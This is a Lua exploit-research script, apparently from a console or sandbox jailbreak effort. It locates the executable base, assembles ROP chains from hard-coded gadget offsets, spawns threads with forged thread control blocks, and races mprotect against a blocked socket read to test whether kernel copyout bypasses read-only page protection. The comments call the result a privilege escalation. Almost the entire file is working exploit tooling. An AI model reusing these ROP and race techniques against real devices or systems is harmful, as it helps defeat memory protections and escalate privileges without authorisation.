-- CRASH_CLASS: MODERATE
-- PROBE 398f2: Does kernel copyout bypass mprotect(PROT_READ)?
--
-- Setup: child blocks in read(sock, victim_page, N) on a RW page.
-- Main: mprotect(victim_page, PROT_READ) then writes to socket.
-- If kernel copyout succeeds → data appears on a read-only page.
-- That's a privilege escalation: kernel ignores user-mode protection.
--
-- We CANNOT test userland write on RO pages (kills past pcall).
-- So we check: did the kernel write our data after mprotect?
-- Read on RO is fine (confirmed in 398f Part A).

print("=== PROBE 398f2: mprotect vs kernel copyout ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function w64(addr, lo, hi)
    wd(addr, lo or 0); wd(addr + 4, hi or 0)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive()
    local ok, v = pcall(function() return native.fcall_with_rax(stub, 20) end)
    return ok and N(v) == pid_val
end

local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local eb_lo = rd(N(info) + 0x108) or 0
local eb_hi = rd(N(info) + 0x10C) or 0
print(string.format("eb=%X_%08X", eb_hi, eb_lo))

local function g(off)
    return uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))
end
local function g_lohi(off)
    local lo = eb_lo + off; local hi = eb_hi
    if lo >= 0x100000000 then hi = hi + math.floor(lo / 0x100000000); lo = lo % 0x100000000 end
    return lo, hi
end

local pop_rax_ret = g(0x992)
local pop_rdi_ret = g(0xC9DFE)
local pop_rsi_ret = g(0xD77D)
local pop_rdx_ret = g(0x3B02D7)
local pop_rcx_ret = g(0xE64)
local mov_rdi_rax = g(0x92C67)
local bare_ret    = g(0x42)

-- Ignore SIGSYS, SIGPIPE, SIGBUS
local sa = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(sa) + i, 0) end
wq(sa, uint64(1))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(10), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)

-- Fake TCB for child threads
local tcb_buf = memory.alloc(0x1000)
for i = 0, 0xFFC, 4 do wd(N(tcb_buf) + i, 0) end
local tcb_mid = N(tcb_buf) + 0x800
wd(tcb_mid, tcb_mid % 0x100000000)
wd(tcb_mid + 4, math.floor(tcb_mid / 0x100000000))
local tcb_ptr = memory.alloc(8)
wq(tcb_ptr, uint64(tcb_mid))

local shared = memory.alloc(0x200)
local sf_lo, sf_hi = g_lohi(0x992)
local CHILD_STK = 0x800

-- ============================================
-- PART A: Baseline — recv on RW page works (no protection change)
-- ============================================
print("")
print("-- A: recv baseline (RW page, no mprotect) --")

local spbuf = memory.alloc(16)
wd(N(spbuf), 0xFFFF); wd(N(spbuf)+4, 0xFFFF)
pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(spbuf))) end)
local sr = rd(N(spbuf)) or -1
local sw = rd(N(spbuf) + 4) or -1
print(string.format("sock r=%d w=%d", sr, sw))

if sr >= 0 then
    -- Map RW page, fill with sentinel
    local ok_vp, vpage = pcall(function()
        return mk(477)(uint64(0), uint64(0x4000), uint64(0x3),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    local vph, vpl = 0, 0
    if ok_vp and vpage then vph, vpl = get_hi_lo(vpage) end
    local vpbase = vpl + vph * 0x100000000
    print(string.format("page=%X_%08X", vph, vpl))

    for i = 0, 0x3FFC, 4 do wd(vpbase + i, 0xAAAAAAAA) end

    -- Child: sysarch + read(sr, vpage, 0x10) — blocks until main writes
    local cs = memory.alloc(0x1000)
    for i = 0, 0xFFC, 4 do wd(N(cs) + i, 0) end
    local cb = N(cs)
    local cr = ((cb + CHILD_STK) - ((cb + CHILD_STK) % 16)) - 8
    local sp = cr
    local function push(val) wq(sp, val); sp = sp + 8 end

    -- sysarch(SET_FSBASE=129)
    push(uint64(165))
    push(pop_rdi_ret); push(uint64(129))
    push(pop_rsi_ret); push(uint64(N(tcb_ptr)))
    push(pop_rdx_ret); push(uint64(0))
    push(pop_rcx_ret); push(uint64(0))
    push(stub)

    -- read(sr, vpage, 0x10)
    push(pop_rax_ret); push(uint64(3))
    push(pop_rdi_ret); push(uint64(sr))
    push(pop_rsi_ret); push(vpage)
    push(pop_rdx_ret); push(uint64(0x10))
    push(pop_rcx_ret); push(uint64(0))
    push(stub)

    -- Save recv return
    push(pop_rdi_ret); push(uint64(N(shared) + 0x10))
    push(mov_rdi_rax)

    -- Done marker
    push(pop_rdi_ret); push(uint64(N(shared)))
    push(pop_rax_ret); push(uint64(0xBBBB))
    push(mov_rdi_rax)

    -- thr_exit
    push(pop_rax_ret); push(uint64(431))
    push(pop_rdi_ret); push(uint64(0))
    push(stub)

    wd(N(shared), 0)
    wd(N(shared) + 0x10, 0xFF)

    local pa = memory.alloc(0x38)
    for i = 0, 0x34, 4 do wd(N(pa) + i, 0) end
    w64(N(pa), sf_lo, sf_hi)
    w64(N(pa) + 0x10, cb % 0x100000000, math.floor(cb / 0x100000000))
    w64(N(pa) + 0x18, CHILD_STK, 0)
    pcall(function() mk(455)(uint64(N(pa)), uint64(0x38)) end)

    -- Wait for child to block
    local dummy = 0
    for i = 1, 50000 do dummy = dummy + 1 end

    -- Write trigger data
    local trigger = memory.alloc(16)
    wd(N(trigger), 0xFACEFACE)
    wd(N(trigger)+4, 0xCAFEBABE)
    wd(N(trigger)+8, 0xDEADBEEF)
    wd(N(trigger)+12, 0x12345678)
    pcall(function() mk(4)(uint64(sw), uint64(N(trigger)), uint64(16)) end)

    for i = 1, 100000 do dummy = dummy + 1 end

    local done = rd(N(shared)) or 0
    local recv_ret = rd(N(shared) + 0x10) or 0xFF
    local d0 = rd(vpbase) or 0
    local d1 = rd(vpbase + 4) or 0
    print(string.format("done=%X recv=%d data=%08X %08X", done, recv_ret, d0, d1))
    local baseline_ok = (d0 == 0xFACEFACE)
    print("baseline=" .. (baseline_ok and "OK" or "FAIL"))

    pcall(function() mk(73)(vpage, uint64(0x4000)) end)
    pcall(function() mk(6)(uint64(sr)) end)
    pcall(function() mk(6)(uint64(sw)) end)
end
if not alive() then print("CANARY FAIL A"); return end

-- ============================================
-- PART B: THE TEST — recv on RW page, mprotect to READ during block
-- ============================================
print("")
print("-- B: recv + mprotect(PROT_READ) race --")

local bypass = 0
local efault = 0
local other = 0

for iter = 1, 15 do
    local spb2 = memory.alloc(16)
    wd(N(spb2), 0xFFFF); wd(N(spb2)+4, 0xFFFF)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(spb2))) end)
    local sr2 = rd(N(spb2)) or -1
    local sw2 = rd(N(spb2) + 4) or -1
    if sr2 < 0 then print("socketpair fail " .. iter); break end

    local ok_v, vp = pcall(function()
        return mk(477)(uint64(0), uint64(0x4000), uint64(0x3),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    local vh, vl = 0, 0
    if ok_v and vp then vh, vl = get_hi_lo(vp) end
    if vh == 0 and vl == 0 then
        pcall(function() mk(6)(uint64(sr2)) end)
        pcall(function() mk(6)(uint64(sw2)) end)
        print("mmap fail " .. iter); break
    end
    local vbase = vl + vh * 0x100000000

    -- Fill with sentinel (readable later because we'll mprotect back to RW)
    for i = 0, 0x3FFC, 4 do wd(vbase + i, 0xAAAAAAAA) end

    -- Build child ROP: sysarch + read(sr2, vp, 16) — blocks
    local cs2 = memory.alloc(0x1000)
    for i = 0, 0xFFC, 4 do wd(N(cs2) + i, 0) end
    local cb2 = N(cs2)
    local cr2 = ((cb2 + CHILD_STK) - ((cb2 + CHILD_STK) % 16)) - 8
    local sp = cr2
    local function push(val) wq(sp, val); sp = sp + 8 end

    push(uint64(165))
    push(pop_rdi_ret); push(uint64(129))
    push(pop_rsi_ret); push(uint64(N(tcb_ptr)))
    push(pop_rdx_ret); push(uint64(0))
    push(pop_rcx_ret); push(uint64(0))
    push(stub)

    -- read(sr2, vp, 16)
    push(pop_rax_ret); push(uint64(3))
    push(pop_rdi_ret); push(uint64(sr2))
    push(pop_rsi_ret); push(vp)
    push(pop_rdx_ret); push(uint64(16))
    push(pop_rcx_ret); push(uint64(0))
    push(stub)

    -- Save recv ret
    push(pop_rdi_ret); push(uint64(N(shared) + 0x10))
    push(mov_rdi_rax)

    -- Done marker
    push(pop_rdi_ret); push(uint64(N(shared)))
    push(pop_rax_ret); push(uint64(0xCC00 + iter))
    push(mov_rdi_rax)

    push(pop_rax_ret); push(uint64(431))
    push(pop_rdi_ret); push(uint64(0))
    push(stub)

    wd(N(shared), 0)
    wd(N(shared) + 0x10, 0xFF)

    local pa2 = memory.alloc(0x38)
    for i = 0, 0x34, 4 do wd(N(pa2) + i, 0) end
    w64(N(pa2), sf_lo, sf_hi)
    w64(N(pa2) + 0x10, cb2 % 0x100000000, math.floor(cb2 / 0x100000000))
    w64(N(pa2) + 0x18, CHILD_STK, 0)
    pcall(function() mk(455)(uint64(N(pa2)), uint64(0x38)) end)

    -- Wait for child to block in read()
    local dummy = 0
    for i = 1, 50000 do dummy = dummy + 1 end

    -- ★★★ MPROTECT TO READ-ONLY while child is blocked ★★★
    local ok_mp, rv_mp = pcall(function()
        return mk(74)(vp, uint64(0x4000), uint64(0x1))
    end)

    -- Write data to socket — kernel wakes child and tries copyout to RO page
    local trig = memory.alloc(16)
    wd(N(trig), 0xBEEF0000 + iter)
    wd(N(trig)+4, 0xCAFE0000 + iter)
    wd(N(trig)+8, 0xDEAD0000 + iter)
    wd(N(trig)+12, 0xFACE0000 + iter)
    pcall(function() mk(4)(uint64(sw2), uint64(N(trig)), uint64(16)) end)

    -- Wait for child to finish
    for i = 1, 100000 do dummy = dummy + 1 end

    local done = rd(N(shared)) or 0
    local recv_ret = rd(N(shared) + 0x10) or 0xFF

    -- Restore RW to safely read the page
    pcall(function() mk(74)(vp, uint64(0x4000), uint64(0x3)) end)

    local d0 = rd(vbase) or 0
    local d1 = rd(vbase + 4) or 0
    local d2 = rd(vbase + 8) or 0
    local d3 = rd(vbase + 12) or 0

    local wrote = (d0 == 0xBEEF0000 + iter)
    local sentinel = (d0 == 0xAAAAAAAA)

    if wrote then
        bypass = bypass + 1
        print(string.format("[%02d] ★BYPASS done=%X recv=%d data=%08X %08X %08X %08X",
            iter, done, recv_ret, d0, d1, d2, d3))
    elseif sentinel then
        efault = efault + 1
        if iter <= 3 then
            print(string.format("[%02d] EFAULT done=%X recv=%d sentinel_intact",
                iter, done, recv_ret))
        end
    else
        other = other + 1
        print(string.format("[%02d] OTHER done=%X recv=%d data=%08X %08X",
            iter, done, recv_ret, d0, d1))
    end

    pcall(function() mk(73)(vp, uint64(0x4000)) end)
    pcall(function() mk(6)(uint64(sr2)) end)
    pcall(function() mk(6)(uint64(sw2)) end)

    if not alive() then print("CANARY FAIL B iter " .. iter); break end
end

print(string.format("RESULT: bypass=%d efault=%d other=%d", bypass, efault, other))
if bypass > 0 then
    print("★★★ KERNEL COPYOUT BYPASSES MPROTECT ★★★")
else
    print("kernel respects mprotect (EFAULT on write to RO)")
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 398f2 COMPLETE ===")
